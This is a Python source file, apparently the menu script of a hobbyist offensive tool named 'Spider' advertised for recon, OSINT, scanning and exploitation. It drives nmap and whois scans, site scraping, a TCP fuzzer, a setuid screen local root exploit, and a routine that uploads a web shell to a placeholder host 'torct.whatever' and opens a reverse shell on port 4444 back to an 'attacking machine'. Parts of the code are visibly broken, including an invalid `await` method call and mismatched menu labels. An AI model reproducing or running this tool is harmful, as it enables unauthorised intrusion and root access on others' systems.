# Programmer: Given Lepita
# Project: Hacking
import sys
from time import sleep
from prettytable import PrettyTable
from urllib.request import urlretrieve
from src.exploits.network_info import NetworkIntelligence
from src.exploits.ip_lookup import IPLookUp
from src.exploits.ping import Ping
from src.exploits.payloads import PayLoads
from src.exploits.info_scraper import ScraperInfo
from src.exploits.tcp_fuzzer import TCP_Fuzzer
from src.exploits.root_exploit import ShellRoot
from Webcrawler import WebCrawler

TAB = "\t" * 2
header = """

\t\t\t███████╗██████╗ ██╗██████╗ ███████╗██████╗
\t\t\t██╔════╝██╔══██╗██║██╔══██╗██╔════╝██╔══██╗
\t\t\t███████╗██████╔╝██║██║  ██║█████╗  ██████╔╝
\t\t\t╚════██║██╔═══╝ ██║██║  ██║██╔══╝  ██╔══██╗
\t\t\t███████║██║     ██║██████╔╝███████╗██║  ██║
\t\t\t╚══════╝╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝

"""
header1 = """
   ▄█    █▄       ▄████████  ▄█        ▄█
  ███    ███    ███    ███  ███       ███
  ███    ███    ███    █▀   ███       ███
 ▄███▄▄▄▄███▄▄ ▄███▄▄▄      ███       ███
▀▀███▀▀▀▀███▀  ▀▀███▀▀▀     ███       ███
  ███    ███     ███    █▄  ███       ███
  ███    ███     ███    ███ ███▌    ▄ ███     ▄
  ███    █▀      ██████████ █████▄▄██ █████▄▄██
"""

colors = {
    'BLUE': '\33[1;94m',
    'RED': '\033[1;91m',
    'WHITE': '\33[1;97m',
    'YELLOW': '\33[1;93m',
    'MAGENTA': '\033[1;35m',
    'GREEN': '\033[1;32m',
    'END': '\033[0m',
}

print(colors["YELLOW"], """
    Developer: Given Lepita
    Version: 0.0.1
    Project: Recon, OSINT, Scanning And Exploitation Tool
    """, colors["END"])


def main():
    print(colors["RED"], TAB, header1, colors["END"], colors["BLUE"], header, colors["END"])
    table = PrettyTable()
    table.field_names = [
        "1 - Network Intelligence", "2 - Scraping",
        "3 - IP Lookup", "4 - Payloads", "5 - Ping", "6 - TCP Fuzzer",
        "7 - bash exploits", "8 - Update Tool",
    ]
    options = ["""
[+] NMAP Scans
[+] Robots.txt
[+] Whois information
    """, """
[+] Source Code & HTTP(S) headers
[+] Harvesting Comments
[+] Links(Download Images)
    """, """
[+] IP information(TABLE FORMAT)
[+] Region , Coordiates and MORE!
    """, """
[+] NetCat Shell (Remote Exploitation)
[+] Panel Shell Exploit
[+] FTP Exploit!
    """, "[+] Ping Host", "[+] NEW Exploits & Updates", "[+] TCP Fuzzer", """
[+] setuid screen v4.5.0 local root exploit
"""
    ]

    table.add_row(
        [
            options[0], options[1],
            options[2], options[3],
            options[4], options[5],
            options[6], options[7]
        ]
    )
    table.align = "l"
    print(colors["MAGENTA"], table.field_names, colors["END"])
    baseClass = int(input("Choose option:  "))

    if baseClass == 1:
        newAgent = input("Enter URL to perfom Network Intelligence on:   ")
        baseObject = NetworkIntelligence(newAgent)

        print("Perfoming Network Intelligence On {}".format(newAgent))
        sleep(0.8)
        baseObject.network_mapper()
        baseObject.robots()
        baseObject.whois_info()

    elif baseClass == 2:
        newAgent = input("Enter URL to perfom Scraping on:   ")
        baseObject = ScraperInfo(newAgent)

        print("CAUTION: Make Sure You Have GOOD Bandwith And A Strong Signal")
        sleep(0.8)
        print("\nPerforming  Web Scraping On {}".format(newAgent))
        sleep(0.2)
        baseObject.HTTP_headers()
        baseObject.sourceCode()
        baseObject.siteImages()
        baseObject.commentHarvester()

    elif baseClass == 3:
        newAgent = input("Enter IP Address:   ")
        baseObject = IPLookUp(newAgent)

        try:
            sleep(0.4)
            print("Extracting information about {} from Freegeoip.net".format(newAgent))
            baseObject.getInformation()
        except Exception as e:
            print("Error ", e)
    # PAYLOAD class has some bugs
    # No gaurantee it will run
    # I'll fix it when I have time.
    elif baseClass == 4:
        urlUpload = "http://torct.whatever/upload.php"
        port = input("Enter PORT(default[4444]):   ")
        url = input("Enter URL:   ")
        shellDir = input("Input shell(/shell/shell.php):  ")
        ipAddr = input("Enter IP Address(Attacking Machine):   ")
        try:
            if shellDir == "":
                baseObject = PayLoads(url, ipAddr)
                baseObject.upload_shell(urlUpload)
            elif shellDir == "Exit" or shellDir == "exit":
                sys.exit()
            else:
                baseObject = PayLoads(url, ipAddr)
                baseObject.upload_shell(urlretrieve, shellDir)
                if port == "":
                    sock = baseObject.construction()
                    baseObject.await(sock)
                    baseObject.run()
                elif port is not None:
                    sock = baseObject.construction()
                    # baseObject.await(sock)
                    baseObject.run()

        except Exception as e:
            print("Error ", e)
    elif baseClass == 5:
        try:
            ip = input("Enter IP address to ping:  ")
            baseObject = Ping(ip)
            baseObject.pingScan()
        except Exception as e:
            print("Error ", e)
    elif baseClass == 6:
        try:
            host = input("Enter Host/IP Address:   ")
            port = int(input("Enter port number:   "))
            baseObject = TCP_Fuzzer(host, port)
            baseObject.run_fuzzer()
        except Exception as e:
            print("Error ", e)
    elif baseClass == 7:
        try:
            baseObject = ShellRoot()
            baseObject.exploit()
        except Exception as e:
            print("Error ", e)
    elif baseClass == 8:
        try:
            default = "https://google.com/"
            baseObject = WebCrawler(default)
            baseObject.update_tool()
        except Exception as e:
            print("Error ", e)

    else:
        default = "https://google.com/index.html"
        baseObject = WebCrawler(default)
        baseObject.get_absolute_url()


if __name__ == "__main__":
    main()
